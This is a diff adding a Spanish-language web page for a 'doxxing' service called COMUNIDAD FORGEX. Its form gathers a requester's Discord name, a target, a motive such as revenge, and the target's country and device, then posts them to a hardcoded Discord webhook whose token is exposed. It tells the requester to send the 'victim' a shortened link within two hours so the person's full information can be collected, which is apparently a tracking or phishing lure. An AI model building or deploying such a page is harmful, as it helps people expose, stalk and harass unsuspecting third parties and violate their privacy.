@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<title>COMUNIDAD FORGEX</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<style>
+  body{margin:0;background:#000000;color:#ffffff;font-family:system-ui;padding:20px;text-align:center}
+  h1{font-size:3rem;background:linear-gradient(90deg,#0066ff,#00aaff);-webkit-background-clip:text;color:transparent;margin:60px 0}
+  p{font-size:1.4rem;max-width:900px;margin:30px auto;line-height:1.8;color:#ffffff}
+  .card{background:#111111;border:2px solid #0066ff;border-radius:20px;padding:30px;margin:40px auto;max-width:700px;box-shadow:0 10px 40px rgba(0,102,255,.3)}
+  .card h2{font-size:2rem;color:#0066ff;margin-bottom:20px}
+  label{display:block;font-size:1.3rem;color:#cccccc;margin:15px 0 5px;text-align:left}
+  input, select, textarea{width:100%;padding:12px;background:#222222;border:1px solid #0066ff;border-radius:10px;color:#ffffff;font-size:1.1rem;margin-bottom:20px}
+  select{background:#222222;color:#ffffff}
+  .error{color:#ff5555;font-size:1.1rem;margin-top:-15px;margin-bottom:15px;display:block}
+  button{background:#0066ff;color:#ffffff;padding:15px 40px;border:none;border-radius:50px;font-size:1.4rem;font-weight:bold;cursor:pointer;margin:20px 0}
+  button:hover{background:#0055cc}
+  .warning{background:#330000;border:1px solid #ff3333;padding:15px;border-radius:10px;margin:30px 0;font-size:1.1rem;color:#ffaaaa}
+  .success{display:none;background:#001111;border:1px solid #0066ff;padding:20px;border-radius:10px;margin:30px 0}
+</style>
+</head>
+<body>
+<h1>COMUNIDAD FORGEX</h1>
+<p>¿Te gustaría doxear a tu amig@ de forma divertida y segura?</p>
+<div class="card">
+  <h2>Solicita información personalizada</h2>
+  <p>Haz click aquí para comenzar el proceso</p>
+  <button onclick="mostrarFormulario()">CLIC AQUÍ</button>
+</div>
+<div class="card" id="formulario" style="display:none">
+  <h2>Completa los datos</h2>
+  <p>Por favor escribe tu nombre de Discord (correcto para poder enviarte la info)</p>
+  <input type="text" id="discord1" placeholder="ej: tuntun#1234">
+  <span id="discordError" class="error"></span>
+
+  <label>Repite tu nombre de Discord para confirmar</label>
+  <input type="text" id="discord2" placeholder="ej: tuntun#1234">
+
+  <label>¿Para quién es? (ej: amigo, hermana, primo, broma, etc.)</label>
+  <input type="text" id="paraquien" placeholder="ej: mi amigo Juan">
+
+  <label>¿Por qué quieres saber la información de esta persona?</label>
+  <textarea id="motivo" rows="4" placeholder="ej: por curiosidad, broma, venganza, etc. (mínimo 100 caracteres)"></textarea>
+  <span id="motivoError" class="error"></span>
+
+  <label>País de la persona (ej: México, Colombia, España, etc.)</label>
+  <input type="text" id="pais" placeholder="ej: México">
+
+  <label>Dispositivo que usa</label>
+  <select id="dispositivo">
+    <option value="">Selecciona un dispositivo (opcional)</option>
+    <option value="Windows">Windows</option>
+    <option value="Linux">Linux</option>
+    <option value="macOS">macOS</option>
+    <option value="Android">Android</option>
+    <option value="iPhone">iPhone</option>
+    <option value="iPad">iPad</option>
+    <option value="Chrome OS">Chrome OS</option>
+    <option value="PlayStation">PlayStation</option>
+    <option value="Xbox">Xbox</option>
+    <option value="Nintendo Switch">Nintendo Switch</option>
+  </select>
+  <span id="dispositivoError" class="error"></span>
+
+  <button onclick="validarYEnviar()">ENVIAR PEDIDO</button>
+  <div class="warning">
+    <strong>ADVERTENCIA:</strong> Lo que hacemos puede poner en riesgo la información de otras personas y puede ser ilegal en algunos países. Úsalo bajo tu propia responsabilidad.
+  </div>
+</div>
+<div class="success" id="exito">
+  <h2>¡Información enviada correctamente!</h2>
+  <p>Por favor espere aproximadamente de <strong>1 a 5 horas</strong>. Si después de ese tiempo la info no ha sido enviada, vuelva a enviarla.</p>
+  <p>Su victima debe ingresar a la pagina que se le muestra a continuacion antes de 2 horas o sera confundida su informacion <strong>Haga que su victima ingrese a el link antes de tiempo</strong>.</p>
+  <br>
+  <p>Para poder recopilar la información completa de la persona, debes enviarle este link:</p>
+  <p style="font-size:1.5rem;font-weight:bold;color:#0066ff">http://bit.ly/3YjOnrm</p>
+  <p>(Este link es solo para tu víctima. Por favor no ingreses tú)</p>
+</div>
+<script>
+const WEBHOOK = "https://discord.com/api/webhooks/1447276191961841905/IWpiF5AZjKc8iHpch5JkReeixmIjZv13QR4ZvS-ldQeiniF-iCVLyotHDlEEsdcETyyU";
+
+function validarYEnviar() {
+  const discord1 = document.getElementById('discord1').value.trim();
+  const discord2 = document.getElementById('discord2').value.trim();
+  const paraquien = document.getElementById('paraquien').value.trim();
+  const motivo = document.getElementById('motivo').value.trim();
+  const pais = document.getElementById('pais').value.trim();
+  const dispositivo = document.getElementById('dispositivo').value;
+
+  // Limpiar errores
+  document.getElementById('discordError').textContent = '';
+  document.getElementById('motivoError').textContent = '';
+  document.getElementById('dispositivoError').textContent = '';
+
+  let valido = true;
+
+  if (!discord1 || !discord2) {
+    document.getElementById('discordError').textContent = 'Debes ingresar tu Discord en ambos campos';
+    valido = false;
+  } else if (discord1 !== discord2) {
+    document.getElementById('discordError').textContent = 'Los nombres de Discord no coinciden';
+    valido = false;
+  }
+
+  if (motivo.length < 100) {
+    document.getElementById('motivoError').textContent = 'El motivo debe tener mínimo 100 caracteres (actual: ' + motivo.length + ')';
+    valido = false;
+  }
+
+  // Dispositivo opcional, pero si elige uno debe ser válido (no valida si está vacío)
+  if (dispositivo && !['Windows','Linux','macOS','Android','iPhone','iPad','Chrome OS','PlayStation','Xbox','Nintendo Switch'].includes(dispositivo)) {
+    document.getElementById('dispositivoError').textContent = 'El dispositivo seleccionado no es válido';
+    valido = false;
+  }
+
+  if (!valido) return;
+
+  const mensaje = 
+`**NUEVO PEDIDO COMUNIDAD FORGEX**
+**Solicitado por (Discord):** ${discord1}
+**Objetivo:** ${paraquien}
+**Motivo:** ${motivo}
+**País:** ${pais || 'No especificado'}
+**Dispositivo:** ${dispositivo || 'No especificado'}
+**Hora:** ${new Date().toLocaleString()}`;
+
+  fetch(WEBHOOK, {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({content: mensaje})
+  });
+
+  document.getElementById('formulario').style.display = 'none';
+  document.getElementById('exito').style.display = 'block';
+}
+
+function mostrarFormulario() {
+  document.querySelector('.card').style.display = 'none';
+  document.getElementById('formulario').style.display = 'block';
+}
+</script>
+</body>
+</html>
